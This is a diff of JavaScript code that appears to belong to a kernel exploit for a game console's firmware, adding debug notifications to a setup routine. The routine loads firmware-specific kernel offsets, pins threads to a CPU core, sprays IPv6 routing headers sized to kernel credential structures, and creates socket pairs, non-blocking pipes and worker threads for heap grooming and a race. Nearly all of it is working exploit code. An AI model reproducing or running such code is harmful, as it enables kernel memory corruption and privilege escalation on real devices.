@@ -679,79 +679,100 @@ function init() {
   log('Kernel offsets loaded for FW ' + FW_VERSION);
   return true;
 }
-var prev_core = -1;
-var prev_rtprio = -1;
-var cleanup_called = false;
 function setup() {
   try {
+    send_notification('SETUP: entered');
+
     debug('Preparing netctrl...');
 
-    // حفظ حالة الكور والأولوية الحالية
     prev_core = get_current_core();
     prev_rtprio = get_rtprio();
     pin_to_core(MAIN_CORE);
     set_rtprio(MAIN_RTPRIO);
     debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
+
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     if (spray_rthdr_len <= 0) {
+      send_notification('SETUP FAIL: build_rthdr main <= 0');
       cleanup(true);
       return false;
     }
+
     for (var i = 0; i < IPV6_SOCK_NUM; i++) {
       var base = spray_rthdr_rop.add(i * UCRED_SIZE);
       build_rthdr(base, UCRED_SIZE);
       write32(base.add(0x04), RTHDR_TAG | i);
     }
+
     write64(msg.add(0x10), msgIov);
     write64(msg.add(0x18), MSG_IOV_NUM);
+
     var dummyBuffer = malloc(0x1000);
     if (!dummyBuffer) {
+      send_notification('SETUP FAIL: malloc dummyBuffer');
       cleanup(true);
       return false;
     }
+
     fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
     write64(uioIovRead.add(0x00), dummyBuffer);
     write64(uioIovWrite.add(0x00), dummyBuffer);
+
     socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
     uio_sock_0 = read32(uio_sock);
     uio_sock_1 = read32(uio_sock.add(4));
+
     socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
     iov_sock_0 = read32(iov_sock);
     iov_sock_1 = read32(iov_sock.add(4));
+
     for (var s = 0; s < ipv6_socks.length; s++) {
       ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
       if (ipv6_socks[s].eq(BigInt_Error)) {
+        send_notification('SETUP FAIL: ipv6 socket idx=' + s);
         cleanup(true);
         return false;
       }
     }
+
     free_rthdrs(ipv6_socks);
+
     pipe(pipe_sock);
     master_pipe[0] = read32(pipe_sock);
     master_pipe[1] = read32(pipe_sock.add(4));
+
     pipe(pipe_sock);
     victim_pipe[0] = read32(pipe_sock);
     victim_pipe[1] = read32(pipe_sock.add(4));
+
     masterRpipeFd = master_pipe[0];
     masterWpipeFd = master_pipe[1];
     victimRpipeFd = victim_pipe[0];
     victimWpipeFd = victim_pipe[1];
+
     fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
+
     init_threading();
     if (!create_workers()) {
+      send_notification('SETUP FAIL: create_workers');
       cleanup(true);
       return false;
     }
+
     if (!init_workers()) {
+      send_notification('SETUP FAIL: init_workers');
       cleanup(true);
       return false;
     }
+
     debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
+    send_notification('SETUP OK');
     return true;
   } catch (e) {
+    send_notification('SETUP EXCEPTION: ' + e);
     cleanup(true);
     return false;
   }
